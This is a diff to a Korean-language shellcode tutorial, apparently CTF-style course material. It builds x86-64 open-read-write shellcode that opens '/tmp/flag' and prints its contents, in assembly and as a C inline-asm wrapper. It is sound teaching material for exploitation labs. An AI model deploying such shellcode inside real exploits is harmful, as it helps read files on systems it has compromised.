@@ -81,3 +81,71 @@ syscall           ; read(fd, buf, 0x30)
 |syscall|rax|arg0 (rdi)|arg1 (rsi)|arg2 (rdx)|
 |-|-|-|-|-|
 |write|0x01|unsigned int fd|const char* buf|size_t count|
+
+```
+move rdi, 1        ; rdi = 1 ; fd = stdout
+move rax, 1        ; rax = 1 ; syscall_write
+syscall            ; write(1, buf, 0x30)
+```
+1. 출력은 stdout으로 할 것이므로, rdi를 0x1로 설정한다.
+2. rsi와 rdx는 read에서 사용한 값을 그대로 사용한다.
+3. write 시스템콜을 호출하기 위해서 rax를 1로 설정한다.
+
+이를 모두 종합하면 아래와 같다.
+```
+;Name: orw.S
+
+push 0x67
+mov rax, 0x616c662f706d742f
+push rax
+mov rdi, rsp
+xor rsi, rsi
+xor rdx, rdx
+mov rax, 0x2
+syscall
+mov rdi, rax
+mov rsi, rsp
+sub rsi, 0x30
+mov rdx, 0x30
+mov rax, 0x0
+syscall
+mov rdi, 0x1
+mov rax, 0x1
+syscall
+```
+```
+// File name: orw.c
+// Compile: gcc -o orw orw.c -masm=intel
+
+__asm__(
+    ".global run_sh\n"
+    "run_sh:\n"
+
+    "push 0x67\n"
+    "mov rax, 0x616c662f706d742f \n"
+    "push rax\n"
+    "mov rdi, rsp    # rdi = '/tmp/flag'\n"
+    "xor rsi, rsi    # rsi = 0 ; RD_ONLY\n"
+    "xor rdx, rdx    # rdx = 0\n"
+    "mov rax, 2      # rax = 2 ; syscall_open\n"
+    "syscall         # open('/tmp/flag', RD_ONLY, NULL)\n"
+    "\n"
+    "mov rdi, rax      # rdi = fd\n"
+    "mov rsi, rsp\n"
+    "sub rsi, 0x30     # rsi = rsp-0x30 ; buf\n"
+    "mov rdx, 0x30     # rdx = 0x30     ; len\n"
+    "mov rax, 0x0      # rax = 0        ; syscall_read\n"
+    "syscall           # read(fd, buf, 0x30)\n"
+    "\n"
+    "mov rdi, 1        # rdi = 1 ; fd = stdout\n"
+    "mov rax, 0x1      # rax = 1 ; syscall_write\n"
+    "syscall           # write(fd, buf, 0x30)\n"
+    "\n"
+    "xor rdi, rdi      # rdi = 0\n"
+    "mov rax, 0x3c	   # rax = sys_exit\n"
+    "syscall		   # exit(0)");
+
+void run_sh();
+
+int main() { run_sh(); }
+```
